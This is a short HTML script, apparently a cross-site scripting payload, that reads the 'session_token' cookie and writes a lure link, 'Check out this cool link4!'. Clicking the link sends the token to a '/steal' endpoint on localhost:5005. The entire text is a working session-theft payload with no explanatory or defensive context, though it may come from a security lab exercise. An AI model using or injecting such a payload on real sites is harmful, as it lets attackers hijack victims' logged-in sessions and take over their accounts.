<script>  
    function getCookie(name) {  
        var value = "; " + document.cookie;  
        var parts = value.split("; " + name + "=");  
        if (parts.length == 2) return parts.pop().split(";").shift();  
    }  
    document.write('<a href="#" onclick="javascript:document.location=\'http://localhost:5005/steal?cookie=\'+getCookie(\'session_token\'); return false;">Check out this cool link4!</a>');  
</script>  
